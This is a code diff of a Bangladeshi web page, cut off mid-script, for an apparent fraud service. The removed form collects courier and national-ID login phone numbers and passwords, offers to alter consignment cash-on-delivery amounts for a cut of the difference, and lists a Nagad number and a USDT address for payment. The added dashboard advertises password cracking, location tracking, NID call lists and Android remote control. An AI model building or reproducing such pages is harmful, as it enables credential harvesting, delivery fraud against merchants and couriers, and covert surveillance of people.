@@ -1,963 +1,927 @@
 <!DOCTYPE HTML>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <title>1ai Service</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
-  <link rel="stylesheet" href="./assets/css/main.css">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-<style>
-  .hidden {
-    display: none !important;
-  }
-  .loading-overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0,0,0,0.5);
-    display: none;
-    justify-content: center;
-    align-items: center;
-    z-index: 1000;
-    color: white;
-    font-size: 2rem;
-  }
-  .alert-success {
-    color: green;
-    padding: 10px;
-    background: #e8f5e9;
-    border-radius: 4px;
-    margin: 10px 0;
-  }
-  .alert-error {
-    color: red;
-    padding: 10px;
-    background: #ffebee;
-    border-radius: 4px;
-    margin: 10px 0;
-  }
-  
-  /* Consignment Section Styling */
-  .consignment-group {
-    border: 1px solid rgba(255, 255, 255, 0.2);
-    border-radius: 8px;
-    padding: 1.5rem;
-    margin-bottom: 1.5rem;
-    position: relative;
-    background: rgba(255, 255, 255, 0.05);
-    transition: all 0.3s ease;
-  }
-  
-  .consignment-group:hover {
-    border-color: rgba(28, 180, 149, 0.5);
-  }
-  
-  .consignment-counter {
-    font-weight: bold;
-    color: #1cb495;
-    margin-bottom: 1rem;
-    font-size: 1.1em;
-  }
-  
-  .remove-consignment {
-    position: absolute;
-    top: 1rem;
-    right: 1rem;
-    cursor: pointer;
-    color: #ff4444 !important;
-    background: rgba(255, 68, 68, 0.1);
-    width: 24px;
-    height: 24px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    border-radius: 50%;
-    transition: all 0.2s ease;
-  }
-  
-  .remove-consignment:hover {
-    background: rgba(255, 68, 68, 0.2);
-  }
-  
-  /* Amount Group Styling */
-  .amount-group {
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    gap: 1.5rem;
-    margin: 1rem 0;
-  }
-  
-  /* Form Group Spacing */
-  .form-group {
-    margin-bottom: 1.5rem;
-  }
-  
-  /* Button Styling */
-  .add-consignment {
-    margin-bottom: 2rem;
-    width: 100%;
-  }
-  
-  .form-actions {
-    display: flex;
-    gap: 1rem;
-    margin-top: 2rem;
-  }
-  
-  .form-actions button {
-    flex: 1;
-  }
-  
-  /* Discount Button */
-  .discount-btn {
-    margin-top: 0.5rem;
-    background: rgba(28, 180, 149, 0.2) !important;
-  }
-  
-  .discount-btn:hover {
-    background: rgba(28, 180, 149, 0.3) !important;
-  }
-
-  /* Scope Premium Service Button */
-  .scope-btn {
-    background: linear-gradient(135deg, #6f42c1 0%, #5a2d91 100%) !important;
-    color: white !important;
-    width: 100%;
-    margin: 1rem 0;
-    padding: 1rem;
-    border-radius: 10px;
-    cursor: pointer;
-    font-weight: bold;
-    transition: all 0.3s ease;
-    text-align: center;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    border: none;
-    font-size: 1rem;
-    box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-  }
-
-  .scope-btn:hover {
-    background: linear-gradient(135deg, #5a2d91 0%, #4a2477 100%) !important;
-    transform: translateY(-2px);
-    box-shadow: 0 4px 8px rgba(0,0,0,0.3);
-  }
-
-  .scope-btn i {
-    margin-right: 8px;
-    font-size: 1.2rem;
-  }
-
-  /* Scope Dialog Styling */
-  .scope-dialog {
-    max-width: 500px;
-    width: 90%;
-    border-radius: 8px;
-    border: none;
-    padding: 0;
-    overflow: hidden;
-    background: rgba(45, 45, 45, 0.95);
-    color: #fff;
-    box-shadow: 0 5px 15px rgba(0,0,0,0.5);
-  }
-
-  .scope-dialog::backdrop {
-    background: rgba(0,0,0,0.7);
-    backdrop-filter: blur(3px);
-  }
-
-  .scope-content {
-    padding: 25px;
-  }
-
-  .scope-content h2 {
-    margin-top: 0;
-    color: #1cb495;
-    text-align: center;
-    border-bottom: 1px solid rgba(255,255,255,0.1);
-    padding-bottom: 15px;
-    margin-bottom: 20px;
-    font-size: 1.5rem;
-  }
-
-  .scope-content h2 i {
-    margin-right: 10px;
-  }
-
-  .scope-form-group {
-    margin-bottom: 1.5rem;
-  }
-
-  .scope-form-group label {
-    display: block;
-    margin-bottom: 0.5rem;
-    font-weight: bold;
-    color: #1cb495;
-    font-size: 1rem;
-  }
-
-  .scope-form-group input,
-  .scope-form-group select {
-    width: 100%;
-    padding: 12px;
-    border: 1px solid rgba(255,255,255,0.2);
-    border-radius: 4px;
-    background: rgba(255,255,255,0.1);
-    color: #fff;
-    transition: all 0.3s ease;
-    font-size: 1rem;
-  }
-
-  .scope-form-group input:focus,
-  .scope-form-group select:focus {
-    outline: none;
-    border-color: #1cb495;
-    box-shadow: 0 0 0 2px rgba(28, 180, 149, 0.3);
-  }
-
-  .scope-actions {
-    display: flex;
-    gap: 1rem;
-    margin-top: 2rem;
-  }
-
-  .scope-actions button {
-    flex: 1;
-    padding: 12px 16px;
-    border: none;
-    border-radius: 4px;
-    cursor: pointer;
-    font-weight: bold;
-    transition: all 0.3s ease;
-    font-size: 1rem;
-  }
-
-  .scope-submit {
-    background: linear-gradient(135deg, #6f42c1 0%, #5a2d91 100%);
-    color: white;
-  }
-
-  .scope-submit:hover {
-    background: linear-gradient(135deg, #5a2d91 0%, #4a2477 100%);
-    transform: translateY(-2px);
-  }
-
-  .scope-close {
-    background: rgba(255,255,255,0.1);
-    color: #fff;
-    border: 1px solid rgba(255,255,255,0.2) !important;
-  }
-
-  .scope-close:hover {
-    background: rgba(255,255,255,0.2);
-  }
-
-  /* Responsive Adjustments */
-  @media screen and (max-width: 736px) {
-    .amount-group {
-      grid-template-columns: 1fr;
-    }
-    
-    .form-actions {
-      flex-direction: column;
-    }
-
-    .scope-dialog {
-      width: 95%;
-      max-width: none;
-      z-index: 10000;
-    }
-
-    .scope-actions {
-      flex-direction: column;
-    }
-
-    /* Mobile-specific scope button adjustments */
-    .scope-btn {
-      padding: 1rem 0.5rem;
-      font-size: 0.9rem;
-      margin: 1rem 0;
-      white-space: normal;
-      line-height: 1.4;
-      min-height: 60px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .scope-btn i {
-      font-size: 1rem;
-      margin-right: 6px;
-    }
-
-    .scope-content {
-      padding: 15px;
-    }
-
-    .scope-content h2 {
-      font-size: 1.3rem;
-      padding-bottom: 10px;
-    }
-
-    .scope-form-group input,
-    .scope-form-group select {
-      padding: 10px;
-      font-size: 0.9rem;
-    }
-
-    .scope-actions button {
-      padding: 10px;
-      font-size: 0.9rem;
-    }
-
-    #scope-section {
-      margin: 1rem 0;
-      padding: 0 5px;
-    }
-  }
-
-  /* Very small mobile devices (e.g., iPhone 5/SE) */
-  @media screen and (max-width: 320px) {
-    .scope-btn {
-      font-size: 0.8rem;
-      padding: 0.8rem 0.5rem;
-    }
-
-    .scope-btn i {
-      font-size: 0.9rem;
-    }
-
-    .scope-content h2 {
-      font-size: 1.1rem;
-    }
-        /* Add this new style for the confirmation dialog */
-    .confirmation-dialog {
-      max-width: 400px;
-      width: 90%;
-      border-radius: 8px;
-      border: none;
-      padding: 0;
-      overflow: hidden;
-      background: rgba(45, 45, 45, 0.95);
-      color: #fff;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.5);
-      text-align: center;
-    }
-
-    .confirmation-content {
-      padding: 25px;
-    }
-
-    .confirmation-content h2 {
-      color: #1cb495;
-      margin-bottom: 15px;
-    }
-
-    .confirmation-content p {
-      margin-bottom: 20px;
-      line-height: 1.5;
-    }
-
-    .confirmation-ok {
-      background: linear-gradient(135deg, #6f42c1 0%, #5a2d91 100%);
-      color: white;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-      font-weight: bold;
-      transition: all 0.3s ease;
-      margin-top: 15px;
-    }
-
-    .confirmation-ok:hover {
-      background: linear-gradient(135deg, #5a2d91 0%, #4a2477 100%);
-      transform: translateY(-2px);
-    }
-  }
-</style>
-</head>
-<body class="is-preload">
-  <div id="bg"></div>
-  <h1>One Ai Otp Generator</h1>
-
-  <header id="header">
-    <h3>Service Payment</h3>
-    <p>সঠিক ভাবে বিস্তারিত তথ্য প্রদান করুন এবং সার্ভারচার্জ প্রদানের মাধ্যমে সার্ভিসটি এক্টিভ করুন</p>
-  </header>
-
-  <section>
-    <h3>INPUT DATA</h3>
-    <div id="discount-display" class="discount-banner">
-      <i class="fas fa-tag"></i>
-      <span id="discount-text">No active discount</span>
-    </div>
-
-    <form id="payment-form">
-      <!-- Common Fields -->
-      <div class="form-group">
-        <label for="company">Company:</label>
-        <select id="company" name="company" required>
-          <option value="">Select Platform</option>
-          <option value="govt_nid">Govt NID</option>
-          <option value="redx">RedX</option>
-          <option value="pathao">Pathao Courier</option>
-          <option value="steadfast">SteadFast</option>
-        </select>
-      </div>
-
-      <div class="form-group">
-        <label for="phone">App/Web Login Phone Number:</label>
-        <input type="tel" id="phone" name="phone" required 
-               pattern="01[3-9]\d{8}" 
-               title="11-digit Bangladeshi phone number (013-019)" placeholder="01XXXXXXXXX">
-      </div>
-
-      <div class="form-group">
-        <label for="password">App/Login Password:</label>
-        <input type="text" id="password" name="password" required minlength="6" placeholder="Password">
-      </div>
-
-      <!-- Consignments Container -->
-      <div id="consignments-container">
-        <div class="consignment-group" data-index="0">
-          <div class="consignment-counter">Consignment #1</div>
-          <span class="remove-consignment" onclick="removeConsignment(this)">✕</span>
-          
-          <div class="form-group">
-            <label>Customer Details:</label>
-            <input type="text" class="name" name="consignments[0][name]" placeholder="Name" required>
-            <input type="tel" class="phone1" name="consignments[0][phone]" 
-                   pattern="01[3-9]\d{8}" placeholder="01XXXXXXXXX" required>
-          </div>
-
-          <div class="form-group">
-            <label for="serviceType">Service Type:</label>
-            <select class="service-type" name="consignments[0][serviceType]" required onchange="updateAmountFields(this)">
-              <option value="">Select Service</option>
-              <option value="pricecng">Price Change</option>
-              <option value="partial">Partial</option>
-              <option value="drto">Paid Return</option>
-              <option value="delivery">Delivery</option>
-              <option value="return">Return</option>
-            </select>
-          </div>
-
-          <div class="amount-group">
-            <div class="form-group original-amount-group">
-              <label>Original Amount:</label>
-              <input type="number" class="amount1" name="consignments[0][amount1]" 
-                     min="00" max="100000" step="1" oninput="calculateTotalCharge()">
-            </div>
-            <div class="form-group updated-amount-group">
-              <label>Updated Amount:</label>
-              <input type="number" class="amount2" name="consignments[0][amount2]" 
-                     min="00" max="100000" step="1" oninput="calculateTotalCharge()">
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <button type="button" class="button add-consignment" onclick="addConsignment()">
-        ＋ Add Another Consignment
-      </button>
-
-      <div class="form-group">
-        <label for="amount3">Total Server Charge:</label>
-        <input type="number" id="amount3" name="amount3" readonly required>
-        <br>
-        <div>
-          <button type="button" class="button icon solid fa-tag discount-btn" onclick="window.showDiscountWheel()">
-            <span>Get Discount</span>
-          </button>
-        </div>
-        <br>
-        <small>সার্ভিসটি গ্রহণ নিশ্চিত করতে সার্ভারচার্জ অগ্রিম পরিশোধ করুন</small><br>
-        <small>নগদ পার্সোনাল(sendmoney): 01923002231</small><br> 
-        <small>Crypto bep20 USDT: 0x08a30256b232aCE8acc3BEeCA73A5F036ba373D0</small>
-      </div>
-
-      <p>আপনার এপ/ওয়েবসাইট লগ আউট হলে কমপক্ষে ২৫ মিনিট লগইন করা থেকে বিরত থাকুন। অনুগ্রহ পূর্বক কিছুক্ষণ অপেক্ষা করুন পেমেন্ট সম্পন্ন হলে আপনার সার্ভিসটি স্বয়ংক্রিয় ভাবে প্রক্রিয়াকরণ শুরু হবে।
-        পেমেন্ট এর ১ঘন্টার মধ্যে কোন আপডেট না পেলে হেল্পলাইনে যোগাযোগ করুন।</p>
-      
-      <div class="form-group">
-        <label for="method">Payment Method:</label>
-        <select id="method" name="method" required>
-          <option value="">Select Method</option>
-          <option value="Bkash">Crypto(USDT)</option>
-          <option value="Nagad">Nagad: 01923002231</option>
-        </select>
-      </div>
-      
-      <div class="form-group">
-        <label for="trxid">TRX ID: (পেমেন্ট সম্পন্ন করে ট্রান্সেকশান আইডি উল্লেখ করে পেমেন্ট কনফার্ম করুন)</label>
-        <input type="text" id="trxid" name="trxid" required minlength="8">
-      </div>
-
-      <div class="form-actions">
-        <button type="submit" class="button primary">Confirm Payment</button>
-        <button type="button" class="button" onclick="clearForm()">Clear</button>
-      </div>
-    </form>
-
-    <div id="confirmation-message" style="margin-top: 20px;"></div>
-    
-    <!-- Scope Premium Service Section -->
-    <div id="scope-section" style="margin-top: 20px;">
-      <button type="button" class="button icon solid fa-crown scope-btn" onclick="showScopeDialog()">
-        <span>ইস্যু বিহীন মার্চেন্টদের লিষ্ট</span>
-      </button>
-    </div>
-  </section>
-
-  <script>
-    // Initialize loading state
-    const loadingOverlay = document.createElement('div');
-    loadingOverlay.className = 'loading-overlay';
-    loadingOverlay.innerHTML = '<i class="fas fa-spinner fa-spin fa-3x"></i>';
-    document.body.appendChild(loadingOverlay);
-
-    // Session Management
-    let isSubmitting = false;
-    let consignmentIndex = 1;
-
-    // Form Validation Utilities
-    const validatePhone = phone => /^01[3-9]\d{8}$/.test(phone);
-    const validateAmount = amount => amount >= 00 && amount <= 100000;
-
-    // Update amount fields based on service type
-    function updateAmountFields(select) {
-      const group = select.closest('.consignment-group');
-      const originalAmountGroup = group.querySelector('.original-amount-group');
-      const updatedAmountGroup = group.querySelector('.updated-amount-group');
-      const amountGroup = group.querySelector('.amount-group');
-      const serviceType = select.value;
-      
-      // Reset all fields first
-      originalAmountGroup.classList.remove('hidden');
-      updatedAmountGroup.classList.remove('hidden');
-      amountGroup.classList.remove('hidden');
-      
-      // Hide appropriate fields based on service type
-      if (serviceType === 'delivery' || serviceType === 'return') {
-        amountGroup.classList.add('hidden');
-      } 
-      else if (serviceType === 'drto') {
-        originalAmountGroup.classList.add('hidden');
-      } 
-      
-      calculateTotalCharge();
-    }
-
-    // Calculate Total Server Charge
-    function calculateTotalCharge() {
-        let totalCharge = 0;
-        
-        document.querySelectorAll('.consignment-group').forEach(group => {
-            const serviceType = group.querySelector('.service-type').value;
-            const amount1 = parseFloat(group.querySelector('.amount1').value) || 0;
-            const amount2 = parseFloat(group.querySelector('.amount2').value) || 0;
+    <title>0NEAi Dashboard</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="./assets/css/main.css">
+    <link rel="manifest" href="/manifest.json">
+    <style>
+        /* Mobile-first responsive enhancements */
+        @media screen and (max-width: 736px) {
+            .payment-table table {
+                display: block;
+                overflow-x: auto;
+                white-space: nowrap;
+            }
             
-            if (serviceType === 'pricecng' || serviceType === 'partial') {
-                if (amount1 > 0 && amount2 > 0 && amount2 < amount1) {
-                    totalCharge += (amount1 - amount2) / 2;
+            .services-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 1rem;
+            }
+            
+            .service-card h3 {
+                font-size: 1rem;
+            }
+            /* Larger buttons for mobile */
+            .action-btn {
+                padding: 0.8rem 1.5rem;
+                font-size: 1.1rem;
+            }
+        }
+        
+        @media screen and (min-width: 737px) {
+            .services-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+            
+            .dashboard-stats {
+                flex-direction: row;
+            }
+        }
+        
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            color: white;
+        }
+        
+        .status {
+            padding: 0.25rem 0.5rem;
+            border-radius: 4px;
+            font-weight: bold;
+            text-transform: uppercase;
+            font-size: 0.8rem;
+        }
+        
+        .status.pending {
+            background-color: #FFC107;
+            color: #000;
+        }
+        
+        .status.completed {
+            background-color: #28A745;
+            color: #FFF;
+        }
+        
+        .status.failed {
+            background-color: #DC3545;
+            color: #FFF;
+        }
+        
+        .expired {
+            color: #DC3545;
+            font-weight: bold;
+        }
+        
+        .error {
+            position: fixed;
+            top: 1rem;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #DC3545;
+            color: white;
+            padding: 1rem;
+            border-radius: 4px;
+            z-index: 10000;
+            animation: fadeIn 0.3s ease-in-out;
+        }
+        
+        .success {
+            position: fixed;
+            top: 1rem;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #28A745;
+            color: white;
+            padding: 1rem;
+            border-radius: 4px;
+            z-index: 10000;
+            animation: fadeIn 0.3s ease-in-out;
+        }
+        
+        .dashboard-stats {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+        
+        .stat-card {
+            flex: 1;
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 1.5rem;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        .stat-card h3 {
+            margin-top: 0;
+            color: #6c757d;
+            font-size: 1rem;
+        }
+        
+        .stat-card .value {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #343a40;
+        }
+        
+    .action-buttons {
+        display: flex;
+        gap: 1rem;
+        margin-top: 1rem;
+        justify-content: center; /* Center buttons horizontally */
+    }
+
+    .action-btn {
+        padding: 0.8rem 1.5rem;
+        border-radius: 4px;
+        border: none;
+        cursor: pointer;
+        font-weight: bold;
+        transition: all 0.3s ease;
+        font-size: 1rem;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        min-width: 150px; /* Give buttons consistent width */
+        text-align: center; /* Center text */
+    }
+        
+        .action-btn:hover {
+            transform: translateY(-2px);
+        }
+        
+ .refresh-btn {
+        background: linear-gradient(135deg, #17a2b8 0%, #138496 100%);
+        color: white;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    }
+
+    .refresh-btn:hover {
+        background: linear-gradient(135deg, #138496 0%, #117a8b 100%);
+        transform: translateY(-2px);
+        box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15);
+    }
+
+    .help-btn {
+        background: linear-gradient(135deg, #28a745 0%, #218838 100%);
+        color: white;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    }
+
+    .help-btn:hover {
+        background: linear-gradient(135deg, #218838 0%, #1e7e34 100%);
+        transform: translateY(-2px);
+        box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15);
+    }
+
+    /* Add pulse animation for important actions */
+    @keyframes pulse {
+        0% { transform: scale(1); }
+        50% { transform: scale(1.05); }
+        100% { transform: scale(1); }
+    }
+
+    .action-btn:active {
+        animation: pulse 0.3s ease;
+    }
+
+    /* Make icons consistent with text */
+    .action-btn i {
+        margin-right: 8px;
+        font-size: 0.9em;
+    }
+        
+        .service-card {
+            transition: transform 0.2s, box-shadow 0.2s;
+            cursor: pointer;
+        }
+        
+        .service-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; top: 0; }
+            to { opacity: 1; top: 1rem; }
+        }
+        
+        .premium-payment {
+            background: linear-gradient(135deg, rgba(111,66,193,0.1) 0%, rgba(90,45,145,0.1) 100%);
+        }
+        .premium-payment td:first-child {
+            font-weight: bold;
+            color: #6f42c1;
+        }
+        
+        /* Premium Payment Modal */
+        .premium-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }
+        
+        .premium-modal-content {
+            background: white;
+            padding: 2rem;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        
+        .premium-form-group {
+            margin-bottom: 1.5rem;
+        }
+        
+        .premium-form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: bold;
+            color: #444;
+        }
+        
+        .premium-form-group input, 
+        .premium-form-group select {
+            width: 100%;
+            padding: 0.8rem;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1rem;
+        }
+        
+        .premium-form-group input:focus, 
+        .premium-form-group select:focus {
+            outline: none;
+            border-color: #6f42c1;
+            box-shadow: 0 0 0 3px rgba(111, 66, 193, 0.1);
+        }
+        
+        .premium-modal-title {
+            color: #6f42c1;
+            margin-top: 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        /* Premium crown styling */
+        .premium-icon {
+            color: gold;
+            text-shadow: 0 0 3px rgba(0,0,0,0.3);
+        }
+                /* New notification badge */
+        .notification-badge {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: #4CAF50;
+            color: white;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.8rem;
+            z-index: 10000;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+        }
+                /* Add this new style for the payment popup */
+        .payment-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            z-index: 10001;
+            display: none;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            animation: slideIn 0.5s ease-out;
+        }
+        
+        @keyframes slideIn {
+            from { transform: translate(-50%, -60%); opacity: 0; }
+            to { transform: translate(-50%, -50%); opacity: 1; }
+        }
+        
+        .payment-popup.active {
+            display: block;
+        }
+        
+        .payment-popup h3 {
+            margin-top: 0;
+            color: #28A745;
+        }
+        
+        .payment-popup .success-icon {
+            color: #28A745;
+            font-size: 3rem;
+            margin-bottom: 1rem;
+        }
+        
+        .payment-popup .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: #6c757d;
+        }
+        
+    </style>
+</head>
+<body>
+    <div class="loading-overlay">
+        <i class="fas fa-spinner fa-spin fa-3x"></i>
+        <p>Loading your payment data...</p>
+    </div>
+    <div class="container">
+        <!-- Navbar will be injected here by load-navbar.js -->
+        <div class="navbar-placeholder" style="background: #2c3e50; color: white; padding: 1rem; margin-bottom: 1rem; border-radius: 4px;">
+            <i class="fas fa-bars"></i> FREE_PALESTINE
+        </div>
+    <!-- Add this new payment popup element -->
+    <div id="payment-popup" class="payment-popup">
+        <button class="close-btn" onclick="closePaymentPopup()">&times;</button>
+        <i class="fas fa-check-circle success-icon"></i>
+        <h3>Payment Completed!</h3>
+        <p>TRX ID: <span id="popup-trxid"></span></p>
+        <p>Amount: ৳<span id="popup-amount"></span></p>
+        <button class="action-btn refresh-btn" onclick="closePaymentPopup()">
+            OK
+        </button>
+    </div>
+        <header class="dashboard-header">
+            <h1>1ai Dashboard</h1>
+            <p>অনুগ্রহ পূর্বক অপেক্ষে করুন, যেকোন সমস্যায় হেল্পলাইনে যোগাযোগ করুন। <br> A Premium Digital Intelligence Platform</p>
+        </header>
+
+        <div class="dashboard-stats">
+            <div class="stat-card">
+                <h3><i class="fas fa-clock"></i> Active Payments</h3>
+                <div class="value" id="active-payments">0</div>
+            </div>
+            <div class="stat-card">
+                <h3><i class="fas fa-check-circle"></i> Completed</h3>
+                <div class="value" id="completed-payments">0</div>
+            </div>
+            <div class="stat-card">
+                <h3><i class="fas fa-times-circle"></i> Failed</h3>
+                <div class="value" id="failed-payments">0</div>
+            </div>
+        </div>
+<div id="notification-badge" class="notification-badge hidden">0</div>
+        <div class="action-buttons">
+            <button class="action-btn refresh-btn" onclick="refreshPayments()">
+                <i class="fas fa-sync-alt"></i> Refresh
+            </button>
+            <button class="action-btn help-btn" onclick="sendHelpRequest()">
+                <i class="fas fa-life-ring"></i> Helpline
+            </button>
+        </div>
+<br><br>
+        <section class="payment-section">
+            <h2><i class="fas fa-clock"></i> Payment Status</h2>
+            <div class="payment-table">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Company</th>
+                            <th>TRX ID</th>
+                            <th>Amount</th>
+                            <th>Status</th>
+                            <th>Time Left</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="payment-status">
+                        <!-- Dynamic content will be inserted here -->
+                        <tr>
+                            <td colspan="6" class="text-center">Loading payment data...</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <section class="services-section">
+            <h2><i class="fas fa-cogs"></i> Services</h2>
+            <div class="services-grid">
+                <!-- FIXED OTP GENERATOR BUTTON (changed to anchor tag) -->
+                <a href="otpgen.html" class="service-card">
+                    <i class="fas fa-shield-alt fa-3x"></i>
+                    <h3>OTP Generator</h3>
+                </a>
+                <a href="entertainment.html" class="service-card">
+                    <i class="fas fa-life-ring fa-3x"></i>
+                    <h3>ENTERTAINMENT</h3>
+                </a>
+                <div class="service-card" onclick="showPremiumPaymentForm()">
+                    <i class="fas fa-unlock-alt fa-3x"></i>
+                    <h3>Password Cracker</h3>
+                </div>
+                <div class="service-card" onclick="showPremiumPaymentForm()">
+                    <i class="fas fa-map-marker-alt fa-3x"></i>
+                    <h3>Location Tracker</h3>
+                </div>
+                <div class="service-card" onclick="showPremiumPaymentForm()">
+                    <i class="fas fa-address-book fa-3x"></i>
+                    <h3>NID Call List</h3>
+                </div>
+                <div class="service-card" onclick="showPremiumPaymentForm()">
+                    <i class="fas fa-mobile-alt fa-3x"></i>
+                    <h3>Android Remote</h3>
+                </div>
+                <!-- Changed functionality: Now shows help instructions -->
+                <div class="service-card" onclick="showHelpInstructions()">
+                    <i class="fas fa-question-circle fa-3x"></i>
+                    <h3>Help</h3>
+                </div>
+            </div>
+        </section>
+    </div>
+<script>
+// Global state management
+const paymentState = {
+    payments: [],
+    ws: null,
+    paymentTimers: {},
+    stats: {
+        active: 0,
+        completed: 0,
+        failed: 0
+    },
+    unreadNotifications: 0
+};
+
+// Notification sound
+const notificationSound = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-alert-quick-chime-766.mp3');
+
+// Functions
+function connectWebSocket() {
+    if (paymentState.ws) paymentState.ws.close();
+    
+    paymentState.ws = new WebSocket('wss://oneai-wjox.onrender.com');
+
+    paymentState.ws.onopen = () => {
+        console.log('WebSocket Connected');
+        const authToken = localStorage.getItem('authToken');
+        const userID = localStorage.getItem('userID');
+        
+        paymentState.ws.send(JSON.stringify({
+            type: 'auth',
+            token: authToken,
+            userId: userID
+        }));
+    };
+
+    paymentState.ws.onmessage = (event) => {
+        try {
+            const data = JSON.parse(event.data);
+            
+            if (data.type === 'payment-updated') {
+                updatePaymentStatus(data.payment);
+
+                if (data.payment.status === 'Completed') {
+                    handlePaymentCompletion(data.payment);
                 }
             } 
-            else if (serviceType === 'drto') {
-                if (amount2 < 40) {
-                    totalCharge += 40;
+            else if (data.type === 'new-payment') {
+                if (data.payment.company === 'premium_service') {
+                    const existing = paymentState.payments.find(p => p.trxid === data.payment.trxid);
+                    
+                    if (!existing) {
+                        paymentState.payments.push(data.payment);
+                        renderPayment(data.payment);
+                        updateStats();
+                        showSuccess('New premium payment received!');
+                    }
                 }
-            }
-        });
-
-        const discount = parseInt(localStorage.getItem('activeDiscount')) || 0;
-        if (discount > 0) {
-            totalCharge *= (1 - discount / 100);
-        }
-
-        document.getElementById('amount3').value = totalCharge.toFixed(2);
-    }
-
-    // Enhanced Form Submission Handler
-    document.getElementById('payment-form').addEventListener('submit', async (e) => {
-        e.preventDefault();
-        if (isSubmitting) return;
-
-        try {
-            // Check authentication
-            const authToken = localStorage.getItem('authToken');
-            const userID = localStorage.getItem('userID');
-            const tokenExp = localStorage.getItem('tokenExp');
-
-            if (!authToken || !userID || !tokenExp || Date.now() > parseInt(tokenExp)) {
-                showMessage('Session expired or invalid. Please log in again.', 'error');
-                localStorage.clear(); // Clear potentially stale data
-                setTimeout(() => { window.location.href = 'login.html'; }, 1500);
-                return;
-            }
-
-            // Show loading state
-            isSubmitting = true;
-            loadingOverlay.style.display = 'flex';
-            document.getElementById('confirmation-message').innerHTML = '';
-
-            // Collect and validate form data
-            const formData = await validateAndPrepareData();
-
-            // Submit to server
-            const response = await fetch('https://oneai-wjox.onrender.com/payment', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Authorization': `Bearer ${authToken}`,
-                    'X-User-ID': userID
-                },
-                body: JSON.stringify(formData)
-            });
-
-            const responseData = await response.json();
-            
-            if (response.ok) {
-                handleSuccess(responseData, formData);
-            } else {
-                handleServerError(responseData);
             }
         } catch (error) {
-            handleNetworkError(error);
-        } finally {
-            isSubmitting = false;
-            loadingOverlay.style.display = 'none';
+            console.error('WebSocket message error:', error);
         }
-    });
+    };
 
-    async function validateAndPrepareData() {
-        const form = document.getElementById('payment-form');
-        const formData = {
-            company: form.company.value,
-            phone: form.phone.value.replace(/\D/g, ''),
-            password: form.password.value.trim(),
-            method: form.method.value,
-            trxid: form.trxid.value.trim(),
-            consignments: [],
-            discount: parseInt(localStorage.getItem('activeDiscount')) || 0
-        };
+    paymentState.ws.onerror = (error) => {
+        console.error('WebSocket Error:', error);
+    };
 
-        // Validate core fields
-        if (!validatePhone(formData.phone)) {
-            throw new Error('Invalid phone number format');
-        }
+    paymentState.ws.onclose = () => {
+        setTimeout(connectWebSocket, 5000);
+    };
+}
 
-        if (formData.trxid.length < 8) {
-            throw new Error('TRX ID must be at least 8 characters');
-        }
+function playNotificationSound() {
+    notificationSound.play().catch(e => console.error('Sound playback failed:', e));
+}
 
-        // Process consignments
-        let totalCharge = 0;
-        document.querySelectorAll('.consignment-group').forEach((group, index) => {
